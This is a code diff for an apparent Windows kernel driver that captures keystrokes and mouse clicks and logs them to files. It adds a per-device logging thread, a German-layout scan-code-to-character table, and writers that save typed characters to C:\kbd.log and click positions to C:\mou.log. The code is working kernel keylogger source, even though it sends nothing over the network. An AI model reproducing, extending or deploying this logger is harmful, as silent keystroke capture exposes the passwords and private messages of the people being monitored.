@@ -3,13 +3,140 @@
 #include "dispatch.h"
 #include <ntstrsafe.h>
 
+typedef NTSTATUS(*tLogToFileFunc)(PLIST_ENTRY pListEntry, HANDLE hFile);
+
+typedef struct LogThreadData {
+	LogType type;
+	tLogToFileFunc pLogToFileFunc;
+	PUNICODE_STRING pFileName;
+}LogThreadData;
+
+PKTHREAD pLogThreads[LOG_MAX];
+
+BlockingQueue inputQueues[LOG_MAX];
+
+static UNICODE_STRING kbdLogFileName = RTL_CONSTANT_STRING(L"\\DosDevices\\C:\\kbd.log");
+static UNICODE_STRING mouLogFileName = RTL_CONSTANT_STRING(L"\\DosDevices\\C:\\mou.log");
+
+static void logStartRoutine(PVOID pStartContext);
+static NTSTATUS logKbdToFile(PLIST_ENTRY pKbdListEntry, HANDLE hFile);
+static NTSTATUS logMouToFile(PLIST_ENTRY pMouListEntry, HANDLE hFile);
+
+NTSTATUS startLogThread(PDRIVER_OBJECT pDriverObject, LogType type) {
+	HANDLE hLogThread = NULL;
+	OBJECT_ATTRIBUTES threadAttributes = { 0 };
+	InitializeObjectAttributes(&threadAttributes, NULL, 0, NULL, NULL);
+	LogThreadData* pLogThreadData = (LogThreadData*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(LogThreadData), LOG_THREAD_DATA_TAG);
+
+	if (!pLogThreadData) {
+		DBG_PRINT("startLogThread: ExAllocatePool2 failed\n");
+
+		return STATUS_MEMORY_NOT_ALLOCATED;
+	}
+
+	pLogThreadData->type = type;
+
+	switch (type) {
+	case LOG_KBD:
+		pLogThreadData->pLogToFileFunc = logKbdToFile;
+		pLogThreadData->pFileName = &kbdLogFileName;
+		break;
+	case LOG_MOU:
+		pLogThreadData->pLogToFileFunc = logMouToFile;
+		pLogThreadData->pFileName = &mouLogFileName;
+		break;
+	default:
+		return STATUS_UNSUCCESSFUL;
+		break;
+	}
+
+	NTSTATUS ntStatus = STATUS_SUCCESS;
+
+	if (pLogThreads[type]) {
+		ntStatus = KeWaitForSingleObject(pLogThreads[type], Executive, KernelMode, FALSE, NULL);
+
+		if (!NT_SUCCESS(ntStatus)) {
+			DBG_PRINTF("startLogThread: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);
+
+			return ntStatus;
+		}
+
+		ObfDereferenceObject(pLogThreads[type]);
+		pLogThreads[type] = NULL;
+	}
+
+	ntStatus = IoCreateSystemThread(pDriverObject, &hLogThread, DELETE | SYNCHRONIZE, &threadAttributes, NULL, NULL, logStartRoutine, pLogThreadData);
+
+	if (!NT_SUCCESS(ntStatus)) {
+		DBG_PRINTF("startLogThread: IoCreateSystemThread failed: 0x%lx\n", ntStatus);
+
+		return ntStatus;
+	}
+
+	ntStatus = ObReferenceObjectByHandle(hLogThread, SYNCHRONIZE, NULL, KernelMode, &pLogThreads[type], NULL);
+
+	if (!NT_SUCCESS(ntStatus)) {
+		DBG_PRINTF("startLogThread: ObReferenceObjectByHandle failed: 0x%lx\n", ntStatus);
+	}
+
+	ntStatus = ZwClose(hLogThread);
+
+	if (!NT_SUCCESS(ntStatus)) {
+		DBG_PRINTF("startLogThread: ZwClose failed: 0x%lx\n", ntStatus);
+	}
+
+	return ntStatus;
+}
+
+
+static void logStartRoutine(PVOID pStartContext) {
+	LogThreadData* pLogThreadData = (LogThreadData*)pStartContext;
+	HANDLE hLogFile = NULL;
+	OBJECT_ATTRIBUTES fileAttributes;
+	InitializeObjectAttributes(&fileAttributes, pLogThreadData->pFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
+	IO_STATUS_BLOCK ioStatusBlock = { 0 };
+	NTSTATUS ntStatus = ZwCreateFile(&hLogFile, FILE_WRITE_DATA, &fileAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+
+	if (!NT_SUCCESS(ntStatus)) {
+		DBG_PRINTF("logStartRoutine: ZwCreateFile failed: 0x%lx\n", ntStatus);
+
+		return;
+	}
+
+	BlockingQueue* const pCurBlockingQueue = &inputQueues[pLogThreadData->type];
+
+	// write to file while queue is not empty and waiting
+	while (pCurBlockingQueue->isWaiting || pCurBlockingQueue->size) {
+		LIST_ENTRY* pListEntry = NULL;
+		ntStatus = removeFromBlockingQueue(pCurBlockingQueue, &pListEntry);
+
+		if (!NT_SUCCESS(ntStatus)) {
+			DBG_PRINTF("logStartRoutine: removeBlockingQueue failed: 0x%lx\n", ntStatus);
+
+			continue;
+		}
+
+		pLogThreadData->pLogToFileFunc(pListEntry, hLogFile);
+	}
+
+	ntStatus = ZwClose(hLogFile);
+	ExFreePoolWithTag(pLogThreadData, LOG_THREAD_DATA_TAG);
+
+	if (!NT_SUCCESS(ntStatus)) {
+		DBG_PRINTF("logStartRoutine: ZwClose failed: 0x%lx\n", ntStatus);
+	}
+
+	return;
+}
+
+
 // Scan code to ascii lookup array
 // Currently a mess and for german keyboard layouts.
 static const char scanToAscii[0x80] = {
 	0,  0x1B, // ESC
 	'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'ß', '´', '\b',
 	 '\t', 'q', 'w', 'e', 'r', 't', 'z', 'u', 'i', 'o', 'p', 'ü', '+', '\n', 0, // CTRL
-	'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '^',  0, 
+	'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '^',  0,
 	'#', 'y', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '-',
 	0,
 	0, // LSHIFT
@@ -40,77 +167,12 @@ static const char scanToAscii[0x80] = {
 	0,  /* All other keys are undefined */
 };
 
-
-NTSTATUS startLogThread(PDRIVER_OBJECT pDriverObject) {
-	HANDLE hLogThread = NULL;
-	OBJECT_ATTRIBUTES threadAttributes = { 0 };
-	InitializeObjectAttributes(&threadAttributes, NULL, 0, NULL, NULL);
-	const NTSTATUS ntStatus = IoCreateSystemThread(pDriverObject, &hLogThread, DELETE | SYNCHRONIZE, &threadAttributes, NULL, NULL, logStartRoutine, NULL);
-
-	if (!NT_SUCCESS(ntStatus)) {
-		DBG_PRINTF("startLogThread: IoCreateSystemThread failed: 0x%lx\n", ntStatus);
-	}
-
-	return ntStatus;
-}
-
-
-BlockingQueue kbdInputQueue;
-
-void logStartRoutine(PVOID pStartContext) {
-	UNREFERENCED_PARAMETER(pStartContext);
-
-	HANDLE hLogFile = NULL;
-	UNICODE_STRING logFileName = RTL_CONSTANT_STRING(L"\\DosDevices\\C:\\log.txt");
-	OBJECT_ATTRIBUTES fileAttributes;
-	InitializeObjectAttributes(&fileAttributes, &logFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
-	IO_STATUS_BLOCK ioStatusBlock = { 0 };
-	NTSTATUS ntStatus = ZwCreateFile(&hLogFile, FILE_WRITE_DATA, &fileAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
-
-	if (!NT_SUCCESS(ntStatus)) {
-		DBG_PRINTF("logThread: ZwCreateFile failed: 0x%lx\n", ntStatus);
-
-		return;
-	}
-
-	// write to file while queue is not empty and waiting
-	while (kbdInputQueue.isWaiting || kbdInputQueue.size) {
-		LIST_ENTRY* pListEntry = NULL;
-		ntStatus = removeFromBlockingQueue(&kbdInputQueue, &pListEntry);
-
-		if (!NT_SUCCESS(ntStatus)) {
-			DBG_PRINTF("logKbd: removeBlockingQueue failed: 0x%lx\n", ntStatus);
-
-			continue;
-		}
-
-		KbdListData* const pKbdListData = CONTAINING_RECORD(pListEntry, KbdListData, list);
-		ntStatus = logKbdToFile(&pKbdListData->data, hLogFile);
-
-		if (!NT_SUCCESS(ntStatus)) {
-			DBG_PRINTF("logKbd: logKbdToFile failed: 0x%lx\n", ntStatus);
-
-			continue;
-		}
-
-		ExFreePoolWithTag(pKbdListData, 'KBLI');
-	}
-
-	ntStatus = ZwClose(hLogFile);
-
-	if (!NT_SUCCESS(ntStatus)) {
-		DBG_PRINTF("logKbd: ZwClose failed: 0x%lx\n", ntStatus);
-	}
-
-	return;
-}
-
-
 void logKbdToDbg(PKEYBOARD_INPUT_DATA pKbdInputData) {
 	DBG_PRINT("++++++++++++\n");
 
 	if (!pKbdInputData) {
 		DBG_PRINT("logKbdToDbg: No data\n");
+		DBG_PRINT("++++++++++++\n");
 
 		return;
 	}
@@ -144,17 +206,69 @@ void logKbdToDbg(PKEYBOARD_INPUT_DATA pKbdInputData) {
 }
 
 
-NTSTATUS logKbdToFile(PKEYBOARD_INPUT_DATA pKbdInputData, HANDLE hFile) {
+void logMouToDbg(PMOUSE_INPUT_DATA pMouInputData) {
+
+	if (!pMouInputData) {
+		DBG_PRINT("------------\n");
+		DBG_PRINT("logMouToDbg: No data\n");
+		DBG_PRINT("------------\n");
+
+		return;
+	}
+
+	BOOLEAN log = FALSE;
+	char buffer[0x20] = { 0 };
 	NTSTATUS ntStatus = STATUS_SUCCESS;
 
-	if (!(pKbdInputData->Flags & KEY_BREAK)) {
-		const char key = scanToAscii[pKbdInputData->MakeCode];
+	if (pMouInputData->ButtonFlags == MOUSE_LEFT_BUTTON_DOWN) {
+		log = TRUE;
+		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s", "MOUSE_LEFT_BUTTON_DOWN");
+	}
+	else if (pMouInputData->ButtonFlags == MOUSE_LEFT_BUTTON_UP) {
+		log = TRUE;
+		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s", "MOUSE_LEFT_BUTTON_UP");
+	}
+	else if (pMouInputData->ButtonFlags == MOUSE_RIGHT_BUTTON_DOWN) {
+		log = TRUE;
+		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s", "MOUSE_RIGHT_BUTTON_DOWN");
+	}
+	else if (pMouInputData->ButtonFlags == MOUSE_RIGHT_BUTTON_UP) {
+		log = TRUE;
+		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s", "MOUSE_RIGHT_BUTTON_UP");
+	}
+
+	if (!NT_SUCCESS(ntStatus)) {
+		DBG_PRINT("------------\n");
+		DBG_PRINTF("logMouToDbg: RtlStringCbPrintfA failed: 0x%lx\n", ntStatus);
+		DBG_PRINT("------------\n");
+
+		return;
+	}
+
+	if (log) {
+		DBG_PRINT("------------\n");
+		DBG_PRINTF("logMouToDbg: %s\n", buffer);
+		DBG_PRINTF("logMouToDbg: Position X: %d\n", pMouInputData->LastX);
+		DBG_PRINTF("logMouToDbg: Position Y: %d\n", pMouInputData->LastY);
+		DBG_PRINT("------------\n");
+	}
+
+	return;
+}
+
+
+static NTSTATUS logKbdToFile(PLIST_ENTRY pKbdListEntry, HANDLE hFile) {
+	KbdListData* const pKbdListData = CONTAINING_RECORD(pKbdListEntry, KbdListData, list);
+	NTSTATUS ntStatus = STATUS_SUCCESS;
+
+	if (!(pKbdListData->data.Flags & KEY_BREAK)) {
+		const char key = scanToAscii[pKbdListData->data.MakeCode];
 
 		char buffer[0x8] = { 0 };
 		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%c", key);
 
 		if (!NT_SUCCESS(ntStatus)) {
-			DBG_PRINTF("logKbd: RtlStringCbPrintfA failed: 0x%lx\n", ntStatus);
+			DBG_PRINTF("logKbdToFile: RtlStringCbPrintfA failed: 0x%lx\n", ntStatus);
 
 			return ntStatus;
 		}
@@ -163,7 +277,7 @@ NTSTATUS logKbdToFile(PKEYBOARD_INPUT_DATA pKbdInputData, HANDLE hFile) {
 		ntStatus = RtlStringCbLengthA(buffer, sizeof(buffer), &strLen);
 
 		if (!NT_SUCCESS(ntStatus)) {
-			DBG_PRINTF("logKbd: RtlStringCbLengthA failed: 0x%lx\n", ntStatus);
+			DBG_PRINTF("logKbdToFile: RtlStringCbLengthA failed: 0x%lx\n", ntStatus);
 
 			return ntStatus;
 		}
@@ -172,12 +286,60 @@ NTSTATUS logKbdToFile(PKEYBOARD_INPUT_DATA pKbdInputData, HANDLE hFile) {
 		ntStatus = ZwWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, buffer, (ULONG)strLen, NULL, NULL);
 
 		if (!NT_SUCCESS(ntStatus)) {
-			DBG_PRINTF("logKbd: ZwWriteFile failed: 0x%lx\n", ntStatus);
+			DBG_PRINTF("logKbdToFile: ZwWriteFile failed: 0x%lx\n", ntStatus);
 
 			return ntStatus;
 		}
 
 	}
+
+	ExFreePoolWithTag(pKbdListData, KBD_LIST_DATA_TAG);
+
+	return ntStatus;
+}
+
+
+static NTSTATUS logMouToFile(PLIST_ENTRY pMouListEntry, HANDLE hFile) {
+	MouListData* const pMouListData = CONTAINING_RECORD(pMouListEntry, MouListData, list);
+	NTSTATUS ntStatus = STATUS_SUCCESS;
+
+	if (pMouListData->data.ButtonFlags == MOUSE_LEFT_BUTTON_DOWN || pMouListData->data.ButtonFlags == MOUSE_RIGHT_BUTTON_DOWN) {
+		char buffer[0x20] = { 0 };
+
+		if (pMouListData->data.ButtonFlags == MOUSE_LEFT_BUTTON_DOWN) {
+			ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s%d%s%d%c", "LEFT@X:", pMouListData->data.LastX, "Y:", pMouListData->data.LastY, '\n');
+		}
+		else if (pMouListData->data.ButtonFlags == MOUSE_RIGHT_BUTTON_DOWN) {
+			ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s%d%s%d%c", "RIGHT@X:", pMouListData->data.LastX, "Y:", pMouListData->data.LastY, '\n');
+		}
+
+		if (!NT_SUCCESS(ntStatus)) {
+			DBG_PRINTF("logMouToFile: RtlStringCbPrintfA failed: 0x%lx\n", ntStatus);
+
+			return ntStatus;
+		}
+
+		size_t strLen = 0;
+		ntStatus = RtlStringCbLengthA(buffer, sizeof(buffer), &strLen);
+
+		if (!NT_SUCCESS(ntStatus)) {
+			DBG_PRINTF("logMouToFile: RtlStringCbLengthA failed: 0x%lx\n", ntStatus);
+
+			return ntStatus;
+		}
+
+		IO_STATUS_BLOCK ioStatusBlock = { 0 };
+		ntStatus = ZwWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, buffer, (ULONG)strLen, NULL, NULL);
+
+		if (!NT_SUCCESS(ntStatus)) {
+			DBG_PRINTF("logMouToFile: ZwWriteFile failed: 0x%lx\n", ntStatus);
+
+			return ntStatus;
+		}
+
+	}
+
+	ExFreePoolWithTag(pMouListData, MOU_LIST_DATA_TAG);
 
 	return ntStatus;
 }
